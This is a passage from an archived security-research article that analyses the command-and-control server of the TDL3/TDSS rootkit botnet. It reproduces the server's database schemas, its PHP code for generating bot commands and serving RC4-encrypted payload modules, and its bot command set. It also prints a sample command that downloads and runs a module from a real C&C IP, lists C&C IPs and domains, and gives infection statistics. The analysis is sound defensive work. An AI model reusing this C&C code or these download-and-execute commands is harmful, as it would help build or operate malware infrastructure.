    50 - ConvertPPC</pre>
<p>Example: a query for number of bot installations between 01.08.2009 and 01.07.2010 for subaccount 0 of partner with <code>affAid</code> 10000 is as follows:</p>
<pre class="oneliner">services|200|10000|0|2009-08-01|2010-07-01</pre>
<h3 id="s14">Main botnet table</h3>
<p>After a bot sends request for commands for the first time, it is added to the ‘bots’ table of the server database. Values of <code>affId</code>, <code>affSid</code> and <code>botName</code> fields are extracted from corresponding fields of request from a bot.</p>
<p>Class <code>mBots</code>, which enables work with <code>bots</code> table, is located in <code>/var/www/engine/library/models/mBots.php</code> file. Functions of adding and editing bot information are realized in <code>/var/www/engine/public/engine.php</code>.</p>
<p>Structure of <code>bots</code> table:</p>
<pre>CREATE TABLE IF NOT EXISTS `bots` (                  
  `affId` int(11) unsigned NOT NULL,                  -- identifier of partner account
  `affIdx` int(11) unsigned NOT NULL,                 -- usually equals to affId
  `affSid` smallint(6) unsigned NOT NULL default '1', -- identifier of additional account
  `botId` int(11) unsigned NOT NULL auto_increment,   -- table key
  `botName` char(60) NOT NULL,                        -- unique bot name (parameter botid in config.ini)
  `botIp` bigint(20) NOT NULL,                        -- bot IP
  `botAdded` int(11) unsigned NOT NULL,               -- date of first bot request to the server
  `botAccess` int(11) unsigned NOT NULL,              -- date of last bot request to the server
  `botCountry` tinyint(4) unsigned NOT NULL,          -- identifier of bot country
  `botSystem` smallint(6) unsigned NOT NULL,          -- identifier of Windows version of infected computer
  `botBrowser` smallint(6) unsigned NOT NULL,         -- identifier of browser version of infected computer
  `botBuild` smallint(6) unsigned NOT NULL,           -- identifier of rootkit version and module TDLCMD.DLL
  PRIMARY KEY  (`botId`),
  KEY `botName` (`botName`),
  KEY `affid_index` (`affId`),
  KEY `botAdded_index` (`botAdded`)
);</pre>
<h3 id="s15">Bot commands</h3>
<p>In the end of <code>engine.php</code> script <code>/var/www/enginedata/commands.php</code> file is activated. Its purpose is to display commands to be executed by bot. <code>commands.php</code> script is generated dynamically using data from <code>commandsinfo</code> table.</p>
<pre>CREATE TABLE IF NOT EXISTS `commandsinfo` (
  `commOwner` int(11) NOT NULL default '1',           -- identifier of user account, who has added a command
  `commId` int(11) unsigned NOT NULL auto_increment,  -- table key
  `commName` varchar(255) NOT NULL,                   -- command name
  `commDesc` text NOT NULL,                           -- command description
  `commExe` varchar(255) NOT NULL,                    -- URL of executable file (for commands related to upload and execution of executable files)
  `commStatus` enum('disable','enable',
      'deleted','temp') NOT NULL default 'enable',    -- command status (active, inactive, temporary, deleted)
  `commAdded` datetime NOT NULL,                      -- time of command creation
  `commCode` text NOT NULL,                           -- command PHP code to be included in commands.php
  `commCodeCond` text NOT NULL,                       -- additional parameters of the command
  `commCodeComm` text NOT NULL,
  `commOrder` int(11) NOT NULL,                       -- command order number
  PRIMARY KEY  (`commId`)
);</pre>
<p>Class <code>mCommands</code>, which enables work with commands, is located in <code>/var/www/engine/library/models/mCommands.php</code>. Procedure for dynamic creation <code>commands.php</code> file is realized in regenerate method – it is called by command from the administration panel:</p>
<pre>function reGenerate() {
        $code = '';
        
        // acquire information about all available commands from database
        $commands = $this-&gt;getSummaryFull();
        for ($i = 0; $i &lt; sizeof($commands); $i++) {
            if ($commands[$i]['commStatus'] == 'enable') {
                // get PHP code for each command
                $code .= $this-&gt;getCode($commands[$i]['commId']) . "\r\n\r\n\r\n";
            }
        }
        
        // read template file
        // it contains static code, which should be included in commands.php
        $templateFile = dirname(__FILE__).DS.'commands.template';
        $fp = fopen($templateFile, 'r');
        $template = fread($fp, filesize($templateFile));
        fclose($fp);
        
        $template = str_replace('%COMMS%', $code, $template);
        
        // write commands.php to the disk
        $file = '/var/www/enginedata/commands.php';
        $fp = fopen($file, 'w');
        fwrite($fp, $template);
        fclose($fp);
    }
</pre>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/add_command.png" alt="Adding a new command to the administration panel" width="574" height="383">
<p>Adding a new command to the administration panel</p>
</div>
<p>It is possible to specify the following parameters for each command:</p>
<ul>
<li>Target country IDs</li>
<li>Target partner IDs</li>
<li>Target browser versions</li>
<li>Versions of the rootkit and of the TDLCMD.DLL module.</li>
<li>Command lifetime</li>
<li>Maximal number of times a command can be executed.</li>
</ul>
<p>Operator of administration panel can also edit part of PHP code to be included in <code>commands.php</code>.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/edit_command_code.png" alt="Editing command code in the administration panel" width="790" height="443">
<p>Editing command code in the administration panel</p>
</div>
<p>Any bot can process the following commands:</p>
<table class="text"><colgroup><col width="40%"> <col width="60%"> </colgroup>
<thead>
<tr>
<td>Command</td>
<td>Description</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>botnetcmd.SetCmdDelay(<em>Seconds</em>)</code></td>
<td>Sets interval between server requests</td>
</tr>
<tr>
<td><code>botnetcmd.ModuleDownloadUnxor(<em>URL</em>, <em>LocalPath</em>)</code></td>
<td>Downloads encoded executable module</td>
</tr>
<tr>
<td><code>botnetcmd.FileDownloadRandom(<em>URL</em>, <em>LocalPath</em>)</code></td>
<td>Downloads random file</td>
</tr>
<tr>
<td><code>botnetcmd.LoadExe(<em>FileURL</em>)</code></td>
<td>Downloads and executes executable file</td>
</tr>
<tr>
<td><code>botnetcmd.LoadExeKnock(<em>FileURL</em>, <em>KnockURL</em>)</code></td>
<td>Downloads and executes random file and sends a HTTP-request to random URL on success</td>
</tr>
<tr>
<td><code>botnetcmd.InjectorAdd(<em>ProcessName</em>, <em>DLLName</em>)</code></td>
<td>Injection of DLL into specified process (<code>*</code> — into all processes)</td>
</tr>
<tr>
<td><code>tdlcmd.ConfigWrite(<em>Section</em>, <em>Parameter</em>, <em>Value</em>)</code></td>
<td>Writes random data into <code>config.ini</code></td>
</tr>
<tr>
<td><code>tdlcmd.Download(<em>URL</em>, <em>LocalPath</em>)</code></td>
<td>Downloads random file.</td>
</tr>
</tbody>
</table>
<h3 id="s16">Payload modules</h3>
<p>Primary functions (payload) of the TDL3 rootkit are provided by 
additional modules. These modules are normal dynamic libraries, which 
are downloaded from server and are being injected into random or current
 user mode process.</p>
<p>Information about available payload modules is stored in modules table:</p>
<pre>CREATE TABLE IF NOT EXISTS `modules` (
  `modId` int(11) unsigned NOT NULL auto_increment,   -- table key
  `modName` char(255) NOT NULL,                       -- module name
  `modData` longblob,                                 -- data of module’s executable image
  `modLoads` int(11) unsigned NOT NULL,               -- amount of module downloads
  PRIMARY KEY  (`modId`)
);</pre>
<p>A module file can be downloaded to infected computer by <code>ModuleDownloadUnxor</code> command. It has the following parameters:</p>
<pre class="oneliner">module|ModuleId!Key!</pre>
<table class="text"><colgroup><col width="25%"> <col width="75%"> </colgroup>
<thead>
<tr>
<td>Field</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>ModuleId</code></td>
<td>Module identifier (value of <code>modId</code> field in <code>modules</code> table)</td>
</tr>
<tr>
<td><code>Key</code></td>
<td>Any string (optional). This value is used as a RC4 encoding key for the requested module.</td>
</tr>
</tbody>
</table>
<p>Request for module download is processed in <code>/var/www/engine/public/modules.php</code> file:</p>
<pre>&lt;?php

    require_once( DIR_LIBRARY_MODELS . DS . 'mModules.php' );

    // check encoding key availability in request for module download
    if( preg_match( "%(\d*)!(.*)!%Uis", $request[1], $matches ) ) {
        $modId    = $matches[1];
        $modCrypt = $matches[2];
    } else {
        $modId    = $request[1];
        $modCrypt = FALSE;
    }
 
    // get information about module
    $modDetails = mModules::details( $modId );

    if( $modCrypt ) {
        // return encrypted module data to a client
        print rc4Encrypt( $modCrypt, $modDetails['modData'] );
    } else {
        // return unencrypted module data to a client
        print $modDetails['modData'];
    }
    
    // increment counter of downloads for this module
    mModules::increment( $modId );</pre>
<p>Execution of command for a specific module is performed by sending the following string to a bot:</p>
<pre class="oneliner">ModuleName.Function([Params])</pre>
<table class="text"><colgroup><col width="25%"> <col width="75%"> </colgroup>
<thead>
<tr>
<td>Field</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>ModuleName</code></td>
<td>Name of module DLL on infected computer</td>
</tr>
<tr>
<td><code>Function</code></td>
<td>Name of random function being exported by module DLL</td>
</tr>
<tr>
<td><code>Params</code></td>
<td>Random string or integer parameters being forwarded to called function as arguments</td>
</tr>
</tbody>
</table>
<p>Example: a piece of script, which is responsible for downloading and execution of the <code>remover</code> module (fragment of file <code>commands.php</code>):</p>
<pre>// --- Command #273 Start ---

    $commId = 273;
    
    // get information about command by its identifier
    $commDetails       = $objCommands-&gt;getCommand( $commId );
    $commDetailsCreate = FALSE;
    if( $commDetails == FALSE ) {
        $commDetails['commId']       = $commId;
        $commDetails['commRefences'] = 0;
        $commDetails['commSuccesed'] = 0;
        $commDetailsCreate           = TRUE;
    }
    
    // Condition 1
    if( $botBuild &gt;= 26 ) {
        $commDetailsBot       = mCommands::getCommandExecuted( $commId, $botId );
        $commDetailsBotCreate = FALSE;
        if( $commDetailsBot == FALSE ) {
            $commDetailsBot['botId']        = $botId;
            $commDetailsBot['commId']       = $commId;
            $commDetailsBot['commDate']     = 0;
            $commDetailsBot['commSuccesed'] = 0;
            $commDetailsBotCreate           = TRUE;
        }
        
        // Condition 2
        if( ($commDetailsBot['commSuccesed'] &lt; 1) ) {
            $commSucces  = TRUE;
            // command for module download and its saving under tdlrm.dll
            $commOutput .= "tdlcmd.Download('https://91.212.226.60/czRvvJ+iknAB','tdlrm.dll')\n";
            // command to execute Start() function from tdlrm.dll
            $commOutput .= "tdlrm.Start()\n";
        } else {
            $commSucces  = FALSE;
        }
        
        ...
    
// --- Command #273 End ---</pre>
<p>Adding and editing of modules is performed in the corresponding section of the administration panel:</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/modules.png" alt="Editing a module in the administration panel" width="572" height="243">
<p>Editing a module in the administration panel</p>
</div>
<p>At the moment of access to web-server the following modules were present in the database:</p>
<table class="text"><colgroup><col width="20%"> <col width="80%"> </colgroup>
<thead>
<tr>
<td>Module</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>DDoS</code></td>
<td>Performing DDoS-attacks</td>
</tr>
<tr>
<td><code>Remover</code></td>
<td>Small antivirus to work with <a href="https://web.archive.org/web/20180313192821/http://www.malwarebytes.org/mbam.php">Malwarebytes' Anti-Malware</a> signature bases to search for “foreign” malicious programs on infected computer.</td>
</tr>
<tr>
<td><code>TDLCMD</code></td>
<td>Primary payload module of the rootkit. It includes functions of sending messages to server, command execution etc.</td>
</tr>
<tr>
<td><code>WSP/WSP Popup</code></td>
<td>Module of interception of requests to search engines (Google, Yahoo,
 Bing, Ask, AOL) in order to replace search results which are displayed 
in browser. It includes functions of ads popup.</td>
</tr>
</tbody>
</table>
<p>Modules are protected with unknown encryption program, therefore their analysis may be tricky.</p>
<p>To date of the analysis, the amount of <code>Remover</code> module 
downloads equaled to 19 000 — which is disparately few in comparison to 
the total amount of bots. We can suppose that at the moment of analysis 
the <code>Remover</code> module was being tested and in future its 
developers are going to use own “antivirus” widely to fight with rival 
malicious software</p>
<h3 id="s17">Statistics</h3>
<p>In the end of the article we would like to present some objective 
statistics on the botnet. The data was extracted directly from the 
server databse of the <code>d45648675.cn</code> server as of 7th February 2010.</p>
<p>General data:</p>
<table class="text"><colgroup><col width="75%"> <col width="25%"> </colgroup>
<tbody>
<tr>
<td>Overall number of bots</td>
<td class="num">5&nbsp;247&nbsp;115</td>
</tr>
<tr>
<td>Number of partner accounts</td>
<td class="num">512</td>
</tr>
<tr>
<td>Date of first bot installation</td>
<td class="num">12.08.2009</td>
</tr>
<tr>
<td>Date of last bot installation</td>
<td class="num">07.02.2010</td>
</tr>
</tbody>
</table>
<p>Detailed statistical graphs and diagrams are below.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_infected_machines.png" alt="Amount of new installations by weeks (one point on graph corresponds to one week)" width="600" height="330">
<p>Amount of new installations by weeks (one point on graph corresponds to one week)</p>
</div>
<p>Notable peak on the graph is a “record” of 443 364 unique 
installations on 19th January 2010. All installations were uniformly 
distributed between a number of partner accounts. Possible reason of 
such rapid increase in installations can be exploitation of an unknown 
0-day vulnerability.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_total_bots.png" alt="Число уникальных ботов, которые обращались к серверу в течение недели" width="600" height="330">
<p>Amount of unique bots, accessing the server during a week</p>
</div>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_countries.png" alt="Распределение ботов по странам" width="600" height="400">
<p>Distribution of bots by countries</p>
</div>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_aff.png" alt="Распределение ботов по партнёрам" width="600" height="400">
<p>Distribution of bots by partners</p>
</div>
<p>As you can see from this diagram, the largest partner provided 22.3% 
of all rootkit installations, being two times more effective than second
 most effective partner.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_aff_cat.png" alt="Распределение новых инсталляций по партнёрам" width="600" height="400">
<p>Distribution of new installations by partners</p>
</div>
<p>As you can see from this diagram, 90% of partners provide 1000-50000 
downloads, 50% whereof goes to small partners (1000-5000 downloads). 
There are just 17 partners with amount of downloads over 5000, and only 
one has over 1 000 000 downloads.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_os_ver.png" alt="Версии Windows" width="600" height="300">
<p>Windows versions</p>
</div>
<p>As you can see from this diagram, Windows XP, which doesn’t support 
modern security mechanisms (UAC, DEP and ASLR), is the most vulnerable 
to malicious software. Relatively small amount of infections for Windows
 7 is not connected to its share among other operating systems, which is
 pretty high. It is possible that infection of Windows 7 computer was 
realized mainly by social engineering methods.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_rootkit_ver.png" alt="Версии руткита" width="600" height="300">
<p>Rootkit versions</p>
</div>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/stat_tdlcmd_ver.png" alt="Версии модуля TDLCMD.DLL" width="600" height="300">
<p>Versions of <code>TDLCMD.DLL</code> module</p>
</div>
<p>Since <code>d45648675.cn</code> server still worked to date of 
issuing this article (14th July 2010), we decided to collect more actual
 statistics. We also analyzed tens of TDL3 rootkit droppers to find IPs 
of all active command servers.</p>
<p>Second server <code>a57990057.cn</code> is used right now besides <code>d45648675.cn</code>
 (and some other). Each of these two servers has several IPs, and each 
IP is corresponds to several domains. List of IPs and their 
corresponding domain names is listed in the table below</p>
<table class="data"><colgroup><col width="20%"> <col width="20%"> <col width="20%"> <col width="20%"> <col width="20%"> </colgroup>
<thead>
<tr>
<td>IP</td>
<td>Domain name</td>
<td>Total number of bots</td>
<td>Number of partner accounts</td>
<td>Date of first bot installation</td>
</tr>
</thead>
<tbody>
<tr>
<td>91.212.226.60</td>
<td><code>d45648675.cn</code></td>
<td class="num" rowspan="3">8&nbsp;547&nbsp;241</td>
<td class="num" rowspan="3">857</td>
<td class="num" rowspan="3">12.08.2009</td>
</tr>
<tr>
<td>91.212.226.59</td>
<td><code>zz87jhfda88.com</code></td>
</tr>
<tr>
<td>91.212.226.59</td>
<td><code>lj1i16b0.com</code></td>
</tr>
</tbody>
<tbody>
<tr>
<td>61.61.20.132</td>
<td><code>a57990057.cn</code></td>
<td class="num" rowspan="5">7&nbsp;860&nbsp;677</td>
<td class="num" rowspan="5">2&nbsp;547</td>
<td class="num" rowspan="5">31.12.2009</td>
</tr>
<tr>
<td>61.61.20.132</td>
<td><code>68b6b6b6.com</code></td>
</tr>
<tr>
<td>91.212.226.7</td>
<td><code>0o0o0o0o0.com</code></td>
</tr>
<tr>
<td>61.61.20.135</td>
<td><code>jro1ni1l1.com</code></td>
</tr>
<tr>
<td>61.61.20.135</td>
<td><code>34jh7alm94.asia</code></td>
</tr>
</tbody>
</table>
<p>As you can see from this table, amount of bots attached to the first 
server has increased by about 40% between the dates 07.02.2010 and 
14.07.2010. Total amount of computers, infected by the TDL3 rootkit 
between 12.08.2009 and 14.07.2010, is more than 16 000 000. Till now 
Mariposa botnet was considered as the world largest botnet. At the 
moment of its termination its volume was estimated by experts as 12 000 
000 bots.</p>
<p class="author" style="padding-left: 0px;">Last updated: 17.03.2012</p>
</div>
  ﻿</div>
  <div id="footer">
    <p class="copyright">© 2009–2012 <a href="https://web.archive.org/web/20180313192821/http://www.nobunkum.ru/">NOBUNKUM</a> by <a href="https://web.archive.org/web/20180313192821/http://www.esagelab.ru/">Esage Lab</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/ru/">/на русском языке</a> <a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/about">/about</a> <a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/rss">/rss</a></p>
  </div>
  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-3546318-9']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://web.archive.org/web/20180313192821/https://ssl' : 'https://web.archive.org/web/20180313192821/http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


</body></html>
<!--
     FILE ARCHIVED ON 19:28:21 Mar 13, 2018 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 12:16:17 May 30, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 0.828
  exclusion.robots: 0.248
  exclusion.robots.policy: 0.236
  esindex: 0.013
  cdx.remote: 21.894
  LoadShardBlock: 270.151 (3)
  PetaboxLoader3.datanode: 733.789 (4)
  load_resource: 544.614
  PetaboxLoader3.resolve: 66.136
-->